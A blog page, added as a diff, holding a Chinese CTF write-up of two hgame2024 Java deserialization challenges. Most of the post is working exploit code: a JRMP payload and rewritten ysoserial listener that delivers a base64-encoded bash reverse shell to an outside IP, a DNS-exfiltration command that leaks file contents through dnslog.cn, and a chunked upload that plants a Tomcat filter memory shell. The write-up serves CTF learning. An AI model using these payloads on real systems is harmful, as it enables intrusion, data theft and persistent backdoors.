@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            hgame2024: 两个有趣java
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="i-short-you-1"><a href="#i-short-you-1" class="headerlink" title="i-short-you-1"></a>i-short-you-1</h1><h2 id="JRMP-payload"><a href="#JRMP-payload" class="headerlink" title="JRMP payload"></a>JRMP payload</h2><p>首先记住这个点：</p>
+<p>产生的这个obj，经过readObject后会往该服务器发送JRMP请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        String command = &quot;118.89.61.71:17777&quot;;</span><br><span class="line">        String host;</span><br><span class="line">        int port;</span><br><span class="line">        int sep = command.indexOf(&#x27;:&#x27;);</span><br><span class="line">        if ( sep &lt; 0 ) &#123;</span><br><span class="line">            port = new Random().nextInt(65535);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            host = command.substring(0, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + 1));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = new ObjID(1); // RMI registry</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(Object.class.getClassLoader(), new Class[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line"></span><br><span class="line">        System.out.println(URLEncode(Base64.getEncoder().encodeToString(serialize(obj))).length());</span><br><span class="line">        System.out.println(URLEncode(Base64.getEncoder().encodeToString(serialize(obj))));</span><br><span class="line">//        unserialize(serialize(obj));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们需要一个恶意JRMP服务器，用于发送payload。</p>
+<p>题目只有springboot依赖，所以确定利用链只能这么走：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttr</span><br><span class="line">	POJONode</span><br><span class="line">		TemplatesImpl</span><br></pre></td></tr></table></figure>
+
+<p>ysoserial没有这个payload，要重写ysoserial的JRMPListener。</p>
+<h2 id="重写-JRMP-Listener"><a href="#重写-JRMP-Listener" class="headerlink" title="重写 JRMP Listener"></a>重写 JRMP Listener</h2><p>看了官方wp后，我觉得我搞复杂了。下面是我的做法：</p>
+<p>重写方式：</p>
+<p>将ysoserial的JRMPClient复制到自己的项目，删去main方法，删去import yso自带的东西。</p>
+<p>将ysoserial的JRMPListener复制到跟Client同一包下，删去import，然后main方法改为这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static final void main ( final String[] args )throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    final Object payloadObject = new Object();</span><br><span class="line">    try &#123;</span><br><span class="line">        int port = 17777;</span><br><span class="line">        System.err.println(&quot;* Opening JRMP listener on &quot; + port);</span><br><span class="line">        JRMPListener c = new JRMPListener(port, payloadObject);</span><br><span class="line">        c.run();</span><br><span class="line">    &#125;</span><br><span class="line">    catch ( Exception e ) &#123;</span><br><span class="line">        System.err.println(&quot;Listener error&quot;);</span><br><span class="line">        e.printStackTrace(System.err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在doCall方法中，找到Reflections.setFieldValue，删掉。这附近有一个oos.writeObject(ex);</p>
+<p>这个ex就是反序列化gadget入口。</p>
+<p>将ex换成自己的payload。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new AgentLoader(&quot;org.example.JRMPListener&quot;).loadPOJONodeAgent();</span><br><span class="line"></span><br><span class="line">TemplatesImpl templateImpl = Gadget.getTemplateImpl(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyMC43Ni4xMTguMjAyLzE2NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">POJONode pojoNode = Gadget.getPOJONode(templateImpl);</span><br><span class="line">BadAttributeValueExpException ex = Gadget.getBadAttributeValueExpException(pojoNode);</span><br><span class="line"></span><br><span class="line">oos.writeObject(ex);</span><br></pre></td></tr></table></figure>
+
+<p>其中new AgentLoader这一步，我自己实现了一个动态加载Agent的库，用于去除writeReplace方法的。</p>
+<p>重写后的Listener、Gadget、AgentLoader这些代码在<a target="_blank" rel="noopener" href="https://github.com/un1novvn/Java-unser-utils/tree/main/src/main/java/unknown">github</a></p>
+<p>直接idea里启动。</p>
+<h2 id="部署-JRMP-Listener"><a href="#部署-JRMP-Listener" class="headerlink" title="部署 JRMP Listener"></a>部署 JRMP Listener</h2><p>此时Listener就完成了，该如何部署？</p>
+<p>直接部署到服务器麻烦，又配依赖，又配Agent，又要打包。我选端口转发。</p>
+<p>公网跑frps。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 17000</span><br></pre></td></tr></table></figure>
+
+
+
+<p>本机跑frpc。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 118.89.61.71</span><br><span class="line">server_port = 17000</span><br><span class="line"></span><br><span class="line">[JRMP]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 17777</span><br><span class="line">remote_port = 17777</span><br></pre></td></tr></table></figure>
+
+
+
+<p>启动JRMPListener，这个Listener监听本机17777。</p>
+<p>发送payload到题目靶机，题目靶机访问vps的17777，vps的17777转发到我本机的17777。</p>
+<p>注意，若打题目没成功，要重启题目。Listener被访问一次就要重启一次。</p>
+<h1 id="i-short-you-2"><a href="#i-short-you-2" class="headerlink" title="i-short-you-2"></a>i-short-you-2</h1><p>依赖只有springboot，没有反序列化黑名单， 只限制了长度3333。</p>
+<p>readObject-&gt;toString的gadget用hashmap + HotSwappable + XString 组合，比badattr短。</p>
+<p>然后就是马的字节码要尽量小。我这里用的字节码是无回显rce，使用dns回显。</p>
+<p>这题用了两种做法：回显dns和分块传输打tomcat内存马。</p>
+<h2 id="出dns"><a href="#出dns" class="headerlink" title="出dns"></a>出dns</h2><p>首先封装一个rce的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void rce(String url,String cmd)throws Exception&#123;</span><br><span class="line">    HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();</span><br><span class="line">    Object rce = wrap(SmallShell.rceHorse(cmd));</span><br><span class="line">    String rcebase = Base64.getEncoder().encodeToString(Util.serialize(rce));</span><br><span class="line">    params.put(&quot;payload&quot;,Util.URLEncode(rcebase));</span><br><span class="line">    Request.get(url,params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>wrap，生成用于反序列化对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object wrap(byte[] code) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    TemplatesImpl o = Gadget.getTemplateImpl(code);</span><br><span class="line">    </span><br><span class="line">    // hashMap -&gt; XString -&gt; POJONode-&gt; TemplatesImpl</span><br><span class="line">    POJONode pojoNode = Gadget.getPOJONode(o);</span><br><span class="line">    HashMap hashMapXString = Gadget.get_HashMap_XString(pojoNode);</span><br><span class="line">    return hashMapXString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">// 第一个参数填JVM名字，即main方法所在的完全限定类名</span><br><span class="line">// 第二个参数填jackson的那个agent包的路径。</span><br><span class="line">new AgentLoader(&quot;org.vidar.Main2&quot;).loadPOJONodeAgent();</span><br><span class="line"></span><br><span class="line">      rce(&quot;http://139.224.232.162:32149/backdoor&quot;,&quot;ping \&quot;$(cat /* 2&gt;/dev/null |cut -c 1-20 | xxd -p).z8ozbi.dnslog.cn\&quot;&quot;);</span><br><span class="line">      sleep();</span><br><span class="line">      rce(&quot;http://139.224.232.162:32149/backdoor&quot;,&quot;ping \&quot;$(cat /* 2&gt;/dev/null |cut -c 21-50 | xxd -p).z8ozbi.dnslog.cn\&quot;&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hgame2024-week4/image-20240225134320037.png" alt="image-20240225134320037.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hgame2024-week4/image-20240225134359726.png" alt="image-20240225134359726.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hgame2024-week4/image-20240225134433847.png" alt="image-20240225134433847.png"></p>
+<h2 id="分快传输打filter内存马"><a href="#分快传输打filter内存马" class="headerlink" title="分快传输打filter内存马"></a>分快传输打filter内存马</h2><p>刚好看到这篇文章：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/863792%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%BF%E8%BF%99%E9%A2%98%E6%9D%A5%E5%BC%80%E5%88%80%E3%80%82">https://developer.aliyun.com/article/863792，直接拿这题来开刀。</a></p>
+<p>payload构造与exploit细节看<a target="_blank" rel="noopener" href="https://unk.org.cn/2024/02/29/block-transport">这里</a>。</p>
+<p>这exploit写了我整整一天，如下：</p>
+<p>这exploit写了我整整一天，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main2 &#123;</span><br><span class="line">    public static void sleep()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(500);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object wrap(byte[] code) throws Exception&#123;</span><br><span class="line">        TemplatesImpl o = Gadget.getTemplateImpl(code);</span><br><span class="line">        POJONode pojoNode = Gadget.getPOJONode(o);</span><br><span class="line">        HashMap hashMapXString = Gadget.get_HashMap_XString(pojoNode);</span><br><span class="line">        return hashMapXString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        new AgentLoader(&quot;org.vidar.Main2&quot;).loadPOJONodeAgent();</span><br><span class="line">        exploit();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void rce(String url,String cmd)throws Exception&#123;</span><br><span class="line">        HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();</span><br><span class="line">        Object rce = wrap(SmallShell.rceHorse(cmd));</span><br><span class="line">        String rcebase = Base64.getEncoder().encodeToString(Util.serialize(rce));</span><br><span class="line">        params.put(&quot;payload&quot;,Util.URLEncode(rcebase));</span><br><span class="line">        Request.get(url,params);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void exploit()throws Exception&#123;</span><br><span class="line">        String url = &quot;http://139.224.232.162:32149/backdoor&quot;;</span><br><span class="line"></span><br><span class="line">        //存放请求参数</span><br><span class="line">        HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        byte[] bigHorse = Util.fil2ByteArray(&quot;FilterShell.class&quot;);</span><br><span class="line">        System.out.println(&quot;bigHorse length: &quot;+bigHorse.length);</span><br><span class="line"></span><br><span class="line">        // 将上一次失败的结果删掉</span><br><span class="line">        rce(url,&quot;rm /tmp/FilterShell.class&quot;);</span><br><span class="line">        sleep();</span><br><span class="line"></span><br><span class="line">        byte[][] bytes = Util.splitByteArray(bigHorse,100);</span><br><span class="line"></span><br><span class="line">        for (byte[] aByte : bytes) &#123;</span><br><span class="line">            // 将字节数组转换成 &#123;1,2,3,4,5&#125; 的形式传给写文件马然后再编译成字节码</span><br><span class="line">            Object writeHorse = wrap(SmallShell.writeHorse(aByte,&quot;/tmp/FilterShell.class&quot;));</span><br><span class="line">            String packet = Base64.getEncoder().encodeToString(Util.serialize(writeHorse));</span><br><span class="line">            System.out.println(&quot;writeHorse length: &quot;+packet.length());</span><br><span class="line">            params.put(&quot;payload&quot;,Util.URLEncode(packet));</span><br><span class="line">            Request.get(url,params);</span><br><span class="line">            sleep();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 传输 类加载马，让他加载 /tmp/FilterShell.class 文件</span><br><span class="line">        Object loaderHorse = wrap(SmallShell.contextloaderHorse(&quot;FilterShell&quot;));</span><br><span class="line">        String loaderHorseBase = Base64.getEncoder().encodeToString(Util.serialize(loaderHorse));</span><br><span class="line">        System.out.println(&quot;loaderHorse Length: &quot;+loaderHorseBase.length());</span><br><span class="line">        params.put(&quot;payload&quot;,Util.URLEncode(loaderHorseBase));</span><br><span class="line">        Request.get(url,params);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hgame2024-week4/image-20240225135357549.png" alt="image-20240225135357549.png"></p>
+<p>此时的控制台</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hgame2024-week4/image-20240225140732739.png" alt="image-20240225140732739.png"></p>
+<p>注意，这里没有用proxy使POJONode稳定触发，但我发现了个规律：触发getStyleSheetDom和getOutputProperties随机结果在在靶机开启时确定。如果第一次请求发现先调用的是getStyleSheetDom，那么以后所有请求调用的都是他。</p>
+<p>这样就直接重启靶机，直到控制台没有出现getStyleSheetDom，说明先调用的是getOutputProperties。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#i-short-you-1"><span class="toc-text">i-short-you-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMP-payload"><span class="toc-text">JRMP payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%86%99-JRMP-Listener"><span class="toc-text">重写 JRMP Listener</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2-JRMP-Listener"><span class="toc-text">部署 JRMP Listener</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#i-short-you-2"><span class="toc-text">i-short-you-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BAdns"><span class="toc-text">出dns</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%BF%AB%E4%BC%A0%E8%BE%93%E6%89%93filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">分快传输打filter内存马</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
